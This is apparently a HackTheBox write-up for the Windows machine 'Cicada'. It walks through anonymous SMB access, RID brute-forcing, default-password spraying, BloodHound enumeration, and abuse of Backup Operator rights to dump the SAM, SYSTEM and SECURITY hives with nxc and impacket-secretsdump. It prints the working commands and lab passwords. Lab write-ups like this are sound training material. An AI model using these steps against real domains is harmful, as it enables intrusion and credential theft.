---
categories:
    - htb
layout: post
title: Cicada Writeup - HackTheBox
tags:
    - writeup
    - hackthebox
    - easy
---

Cicada is an easy Windows HackTheBox machine, It bascially involves finding credentials using basic enumeration and getting access to the Backup Operator credentails to compramise the machine.

## Enumeration

Lets begin with nmap
```shell
PORT     STATE SERVICE       REASON          VERSION                      
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus              
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-07-11 22:13:15Z)                                       
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC        
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn                                                                       
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb 
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Issuer: commonName=CICADA-DC-CA/domainComponent=cicada
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb 
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Issuer: commonName=CICADA-DC-CA/domainComponent=cicada
| Public Key type: rsa
| Public Key bits: 2048
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb 
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Issuer: commonName=CICADA-DC-CA/domainComponent=cicada
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
3269/tcp open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb 
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Issuer: commonName=CICADA-DC-CA/domainComponent=cicada
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows
Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 57184/tcp): CLEAN (Timeout)
|   Check 2 (port 2906/tcp): CLEAN (Timeout)
|   Check 3 (port 19380/udp): CLEAN (Timeout)
|   Check 4 (port 26575/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2025-07-11T22:13:58
|_  start_date: N/A
|_clock-skew: 6h59m59s
```

The scan result mostly shows that it is common windows DC ports open. Since we don't have any credentails we can try to check for anonymous access to smb share. We can do that using 
```shell
nxc smb 10.129.231.149 -u 'dsad' -p '' --shares
```
![nxc share output](/assets/posts/cicada/2025-07-11-cicada-nxc.png)

We can see that we have access to the HR share. Lets use impacket-smbclient to enumerate the share

```shell
impacket-smbclient xcr@10.129.231.149 -no-pass
```
![nxc share output](/assets/posts/cicada/2025-07-11-cicada-smb.png)

The `Notice from HR.txt` contains default credentials
![nxc share output](/assets/posts/cicada/2025-07-11-cicada-note.png)

Since we have a default password , lets try to gather users list, We can do this either by using impackets `lookupsid` or `nxc --rid-brute` flag
```shell
nxc smb 10.129.231.149 -u 'dsad' -p '' --rid-brute
```
![nxc share output](/assets/posts/cicada/2025-07-11-cicada-rid.png)
Now with some linux magic we can filter to just have the users list
```shell
john.smoulder
sarah.dantelia
michael.wrightson
david.orelious
emily.oscars
```
We discover that `michael.wrightson` has the default password set
![nxc share output](/assets/posts/cicada/2025-07-11-cicada-bf.png)
```shell
cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
```

## Foothold
Since we have a valid user, lets enumerate the domain using bloodhound. I was facing some issues so I ended up getting a valid TGT to perform bloodhound
```
bloodhound-python -ns 10.129.231.149 -d cicada.htb -u 'michael.wrightson' --disable-autogc --zip -c all -k -no-pass
```
Checking bloodhound we can see that user `david.orelious` has his password in the description field
![nxc share output](/assets/posts/cicada/2025-07-11-cicada-bh.png)
Checking smb shares we can see the user can read the DEV share. Checking the share shows that there is powershell backup script which contains credentails
![nxc share output](/assets/posts/cicada/2025-07-11-cicada-smb2.png)
![nxc share output](/assets/posts/cicada/2025-07-11-cicada-note2.png)
We can use the discovered credentails for `emily.oscars` to log into the machine and get the user flag.

## Privilege Escaltion
We can check the privileges of `emily.oscars` and see that the user belongs to the `Backup Operator` group. We can now try to exfiltrate credentails abusing this privilege
There are multiple ways to do it. I am going to be doing it with `nxc`
```shell
nxc smb 10.129.231.149 -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt' -M backup_operator
```
This is make a copy of the `SAM`, `SYSTEM` and `SECURITY` hives and download it locally. When doing it with nxc there was some issue downloading `SECURITY` so I copied it manually and performed the abuse
![nxc share output](/assets/posts/cicada/2025-07-11-cicada-bo.png)
Once downloaded we can use `impacket-secretsdump` to extract credentails
```shell
impacket-secretsdump -sam sam -system system -security security local
```
![nxc share output](/assets/posts/cicada/2025-07-11-cicada-sd.png)
We can now login using the Administrator credentials to get the root flag.

